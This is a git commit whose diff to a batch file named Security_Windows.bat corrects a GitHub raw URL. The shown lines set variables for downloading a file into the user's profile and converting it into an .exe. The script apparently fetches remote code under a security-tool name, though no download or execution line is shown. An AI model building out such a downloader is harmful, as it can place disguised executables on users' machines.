049788ea41514821efbaeaa55e256b61056c8f29
n0t-cr1m3 <raphaelfavreau26@gmail.com>
2024-01-03 21:16:06 +0100

    Ajout du fichier .bat

--- Security_Windows.bat
+++ Security_Windows.bat
@@ -1,5 +1,5 @@
 @echo off
-set "url=https://github.com/n0t_cr1m3/test/raw/main/Security_Windows.bat"
+set "url=https://github.com/n0t-cr1m3/test/raw/main/Security_Windows.bat"
 set "destination=%USERPROFILE%/Security_Windows.bat"
 set "convertedExePath=%USERPROFILE%/Security_Windows.exe"
 
